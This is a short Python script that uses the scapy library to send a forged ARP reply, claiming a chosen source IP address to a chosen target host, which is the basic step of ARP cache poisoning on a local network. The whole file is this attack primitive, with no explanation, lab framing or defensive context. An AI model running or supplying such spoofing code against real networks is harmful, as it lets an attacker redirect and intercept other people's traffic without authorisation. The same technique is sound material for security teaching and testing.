from scapy.all import *
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("src")
parser.add_argument("dst")
args = parser.parse_args()
send(ARP(op=2, psrc=args.src, pdst=args.dst))
